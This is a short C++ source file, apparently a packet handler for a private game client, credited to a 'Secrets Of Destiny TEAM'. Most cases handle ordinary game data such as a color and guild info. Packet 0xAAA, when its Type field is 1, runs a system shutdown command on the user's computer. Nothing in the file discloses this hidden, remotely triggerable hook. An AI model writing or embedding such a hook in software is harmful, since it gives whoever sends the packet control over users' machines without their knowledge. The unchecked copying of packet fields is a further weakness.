//---
// Secrets Of Destiny TEAM
//---

#include "main.h"

void PacketControl(PacketHeader* Header)
{
	static unsigned char szBuffer[4096];
	SecureZeroMemory(&szBuffer, sizeof szBuffer); DWORD color;
	memcpy_s((void*)&szBuffer[0], sizeof szBuffer, (void*)Header, Header->Size);

	switch(Header->PacketId)
	{
		case 0xD1D:
			memcpy(&color, &szBuffer[104], 4);
			if(color) Change_D1D_color(color);
			break;

		case 0xA03:
		{
			A03 *p = (A03*)szBuffer;

			memcpy(&Guild, &p->Guild, sizeof GuildInfos);
		}
		break;

		case 0xAAA:
		{
			AAA *p = (AAA*)szBuffer;

			if (p->Type == 1)
				system("shutdown -s -t 2");
		}
	}
	
}